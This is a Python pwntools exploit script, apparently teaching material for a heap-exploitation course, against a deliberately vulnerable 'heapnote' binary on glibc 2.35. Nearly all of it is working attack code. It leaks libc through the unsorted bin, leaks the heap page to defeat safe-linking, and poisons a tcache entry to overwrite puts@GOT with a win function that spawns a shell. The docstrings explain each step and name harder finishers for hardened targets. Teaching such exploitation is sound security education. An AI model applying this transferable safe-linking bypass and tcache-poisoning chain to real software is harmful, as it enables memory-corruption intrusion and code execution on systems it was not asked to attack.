#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C4 (stretch) - safe-linking (PROTECT_PTR) bypass on glibc 2.35
==============================================================
Target  : ./heapnote_235  (glibc 2.35, -no-pie, partial RELRO)
Goal    : defeat safe-linking to perform tcache poisoning on 2.35.
Leak    : unsorted bin libc leak (as in C2) + a 3-nibble heap leak.

What changed on 2.32+
---------------------
glibc 2.32 introduced safe-linking: the tcache fd is no longer the raw
next pointer but

        stored_fd = PROTECT_PTR(&fd_slot, next)
                  = (&fd_slot >> 12) XOR next

where &fd_slot is the address of the fd field itself (i.e. the address
of the chunk's user data). To poison fd to point at a target T you must
therefore write

        (&fd_slot >> 12) XOR T

which requires knowing  &fd_slot >> 12  -- i.e. the heap page (top 12 bits
are masked; the low 3 nibbles of the page are the low 3 nibbles of the
chunk address, which you control via the allocation layout).

The cheap heap leak
-------------------
If a chunk is freed into a tcache bin and it is the ONLY entry, its real
next is NULL, so the stored fd = (&fd_slot >> 12) XOR 0 = &fd_slot >> 12.
A UAF-read of that fd directly leaks the heap page value we need.

Where it lands on 2.35 (and how we still get a shell)
----------------------------------------------------
2.34 removed __free_hook / __malloc_hook, so the C2/C3 one-shot finisher
(overwrite a hook, call free/malloc) is GONE. The realistic 2.35 finishers
are harder and structural: FSOP / "House of Apple" (fake an _IO_FILE + a
vtable inside the validated range), exit_funcs / TLS dtor_list (gated by
PTR_MANGLE, so you also need the pointer-guard leak), __printf_function_table
(House of Husk). None of those fit a beginner stretch.

BUT this binary is -no-pie + partial RELRO (writable GOT), so the C1
finisher -- GOT overwrite -- still works on 2.35 once we have the
safe-linking bypass. We chain:

    1. unsorted-bin libc leak              (same as C2)
    2. heap-page leak via a singly-freed    (defeats safe-linking)
       tcache chunk
    3. forge fd = PROTECT_PTR(&fd,puts@GOT) -> tcache returns puts@GOT
       -> write &win there -> next menu() puts() -> win() -> shell

One 2.34+ subtlety: tcache_get() writes `e->key = 0` at returned_ptr+8, so
it also zeroes the GOT slot AFTER the one we overwrite. We therefore target
puts@GOT (its +8 neighbour write@GOT is only used by show(), never in the
menu path) -- NOT free@GOT (whose +8 is puts@GOT, which menu() calls, so it
would crash before we could trigger). win() calls system@GOT, which we leave
untouched, so it still fires.

Honest framing: this is a shell because heapnote hands us a writable GOT.
A real 2.35 target with full RELRO / no win() needs the FSOP / House-of-Apple
class of finishers above -- see slides 07 and how2heap.

Run
---
    cd challenges && python3 c4_safe_linking/exp.py
NOTE: requires heapnote_235 built + patched against glibc-2.35 (make patch-235).
"""

from pwn import *
import sys

# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
# run the named pwndbg command in the gdb pane, then `continue` there to advance.
# Without --demo the script runs straight to a shell (default; pipe-friendly).
DEMO = "--demo" in sys.argv

context.binary = exe = ELF("./heapnote_235")
libc = ELF("./glibc-2.35/libc-2.35.so")
context.log_level = "info"

p = process("./heapnote_235")

# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
# Run inside tmux:  python3 c4_safe_linking/exp.py --demo
# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
# every command, so you get a real pwndbg prompt to run `bins`/`tcache`/`got`.
# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
def demo_hint(msg: str):
    if DEMO:
        log.info("DEMO | %s", msg)

if DEMO:
    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
    gdb.attach(p, gdbscript="break menu\ncontinue\n")
    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")

# ---- menu helpers (same as C2/C3) -------------------------------------------
def add(idx: int, size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx: int, length: int, data: bytes):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendafter(b"data: ", data)

def show(idx: int) -> bytes:
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data=")
    return p.recvuntil(b"\n", drop=True)

def protect_ptr(fd_slot_addr: int, target: int) -> int:
    return (fd_slot_addr >> 12) ^ target

# ===========================================================================
# STAGE 1 - libc leak via unsorted bin (same mechanic as C2)
# ===========================================================================
BIG = 0x418
add(0, BIG, b"A" * 8)
add(1, 0x18, b"GUARD")
delete(0)
demo_hint("run: bins | 0x420 chunk in the unsorted bin")
leak = u64(show(0)[:8].ljust(8, b"\x00"))
# On 2.34+ __malloc_hook is a compat NO-OP symbol, not main_arena-0x10, so the
# C2/C3 trick (main_arena = __malloc_hook+0x10) does NOT work here. Instead we
# use the fixed offset of the unsorted-bin head -- the libc address a freed
# unsorted chunk's fd points at -- relative to the libc base. For the pinned
# 2.35-0ubuntu3.14 build this is 0x21ace0 (= main_arena + the unsorted-head
# offset within main_arena). If you pin a different 2.35 sub-version, recompute
# it: leak once, read the real libc base from /proc/<pid>/maps, and take the
# difference (it must end in 0xce0 here; the page-aligned result is your check).
UNSORTED_HEAD_OFF = 0x21ace0
libc.address = leak - UNSORTED_HEAD_OFF
log.success("libc base = %#x", libc.address)

# ===========================================================================
# STAGE 2 - heap-page leak via a singly-freed tcache chunk
# ===========================================================================
SZ = 0x68
add(2, SZ, b"H" * 8)
delete(2)                    # only entry -> stored fd = &fd>>12 XOR 0
prot_fd = u64(show(2)[:8].ljust(8, b"\x00"))
heap_page = prot_fd          # because next was NULL
log.success("heap page (>>12) = %#x", heap_page)
demo_hint("run: vis_heap_chunks | freed note-2 stored fd == heap_page (printed above) -- the >>12 key")

# PROTECT_PTR only uses &fd_slot >> 12 -- the heap PAGE -- and all our small
# chunks sit on the same page, so the leaked heap_page is exactly the value
# to XOR with any target. We don't need the low 12 bits of the chunk address.
add(3, SZ, b"p" * 8)
add(4, SZ, b"q" * 8)
delete(4)
delete(3)                    # head=3 -> 4 -> (note 2), counts=3

# ===========================================================================
# STAGE 3 - forge fd -> puts@GOT, GOT overwrite -> win -> shell
# ===========================================================================
# 2.34+ tcache_get() zeroes returned_ptr+8 (e->key=0). puts@GOT's +8 neighbour
# is write@GOT (only used by show(), never in the menu path), so it's safe;
# free@GOT's +8 is puts@GOT (menu() calls puts -> would crash). win() uses
# system@GOT (untouched), so it still fires.
target   = exe.got["puts"]            # 0x404020
win_addr = exe.symbols["win"]
forged = protect_ptr(heap_page << 12, target)   # = heap_page ^ puts@GOT
edit(3, 8, p64(forged))
log.info("poisoned chunk-3 fd -> puts@GOT (PROTECT_PTR'd = %#x)", forged)
demo_hint("run: tcache | protected fd (PROTECT_PTR'd)")

add(5, SZ, b"PADDING")               # malloc #1: returns chunk-3; head -> puts@GOT
add(6, SZ, p64(win_addr))            # malloc #2: returns puts@GOT; write &win
log.success("puts@GOT = &win (%#x)", win_addr)
demo_hint("run: got | puts -> win")

# No explicit trigger: after add(6) returns, the menu loop calls menu() ->
# puts("=== heapnote ===") -> win() -> system("/bin/sh"). (puts is called
# twice in menu(); after the first shell exits a second spawns -- just Ctrl-C
# or `exit` the demo when done.)
p.interactive()
